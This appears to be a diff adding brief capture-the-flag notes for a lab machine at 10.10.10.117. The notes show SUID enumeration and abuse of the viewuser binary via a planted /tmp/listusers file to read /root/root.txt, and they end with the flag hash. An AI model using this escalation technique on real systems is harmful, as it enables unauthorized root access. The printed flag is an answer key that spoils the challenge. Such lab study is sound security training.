@@ -1,0 +1,19 @@
+#10.10.10.117
+--------------
+#find the file that has the SUID bit
+find / -perm /4000
+
+#go through the file - /usr/bin/viewuser
+
+#create file called listusers in /tmp folder 
+#give execute permission
+chmod 777 /tmp/listusers
+#and enter your command into 'listusers' file to get the contant of root.txt file
+cat /root/root.txt
+#go to /usr/bin
+#execute viewuser
+./viewuser
+
+
+#key
+8d8e9e8be64654b6dccc3bff4522daf3
